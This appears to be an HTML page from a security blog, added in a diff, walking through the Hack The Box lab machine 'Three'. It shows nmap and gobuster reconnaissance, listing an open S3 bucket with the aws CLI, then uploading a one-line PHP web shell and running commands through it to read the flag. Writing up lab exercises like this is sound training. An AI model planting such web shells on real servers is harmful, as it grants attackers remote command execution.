@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>HTB | Three</title>
+  <link rel="stylesheet" href="/style.css" />
+</head>
+<body>
+
+  <header>
+    <div><a href="/index.html" style="color: white; text-decoration: none;"><strong>Timeless</strong></a></div>
+    <nav>
+      <a href="/walkthroughs.html">Walkthroughs</a>
+      <a href="/blog.html">Blog</a>
+      <a href="/whoami.html">whoami</a>
+    </nav>
+  </header>
+
+  <a href="/htb/very-easy.html" class="top-left-back">&lt;&lt; Back</a>
+
+   <div class="wrapper">
+    <img src="/images/htb/very-easy/three/three.png" alt="Three logo" style="width: 10%; height: auto;">  
+     <h1>HTB - Three</h1>
+    <p><strong>Operating System:</strong> Linux<br>
+      <strong>Tags:</strong> TBD</p>
+
+    <h2>Information Gathering</h2>
+    <p>First I started with a basic Nmap scan to identify open ports and services. This scan revealed SSH on port 22 and Apache on port 80.</p>
+    <pre><code>$ nmap -sV -sC 10.129.14.145</code></pre>
+    <img src="/images/htb/very-easy/three/three_nmap.png" alt="Three nmap results">
+      
+    <h2>Vulnerability Assessment</h2>
+      <p>I started by visiting the web server and checked the home page for possible footholds. Not much was available, but I did notice their contact section referenced thetoppers.htb. I went to my <code>etc/hosts/</code> file and added the hostname to my list</p>
+    <img src="/images/htb/very-easy/three/three_hosts.png" alt="Three hosts file">
+     <p>After confirming the home page had nothing, I ran <code>gobuster</code> to look for hidden directories and subdomains. <code>s3.thetoppers.htb</code> was a hit, and I added it to my hosts file as well.</p>
+    <pre><code>$ gobuster vhost -w Wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb --append-domain</code></pre>
+    <img src="/images/htb/very-easy/three/three_gobuster.png" alt="Three gobuster results">
+    <br> 
+    <img src="/images/htb/very-easy/three/three_s3_hosts.png" alt="Three s3 hosts file">
+    <p>I visited the s3 subdomain and found what looked to be an active AWS S3 bucket.</p>
+    <img src="/images/htb/very-easy/three/three_s3_web.png" alt="Three s3 website">
+
+    <h2>Exploitation</h2>
+     <p>Using the CLI, I ran <code>aws</code> to interact directly with the S3 bucket. I set the endpoint at <code>s3.thetoppers.htb</code> and listed all the contents it had.</p>
+     <pre><code>$ aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb</code></pre>
+     <img src="/images/htb/very-easy/.png" alt="Three aws config">
+
+
+    <h2>Post-Exploitation</h2>
+      <p>With access to the S3 bucket, I created a PHP webshell and uploaded it to <code>thetoppers.htb</code>. From there, I visited the website and verified it worked by running <code>whoami</code></p>
+    <pre><code>$ echo &lt;?php system($_GET[&quot;cmd&quot;]); ?&gt; > shell.php<br>$ aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb</code></pre>
+    <img src="/images/htb/very-easy/three/three_upload_shell.png" alt="Three shell uploaded">
+     <pre><code>http://thetoppers.htb/shell.php?cmd=whoami</code></pre>
+    <img src="/images/htb/very-easy/three/three_web_shell.png" alt="Three web shell">
+     <p>I used the webshell to search the host machine and find the flag.</p>
+     <pre><code>http://thetoppers.htb/shell.php?cmd=cd+..;cat+flag.txt</code></pre>
+     <img src="/images/htb/very-easy/three/three_flag.png" alt="Three flag">  
+  </div>
+
+  <footer>
+    &copy; 2025 Timeless. All rights reserved.
+  </footer>
+</body>
+</html>
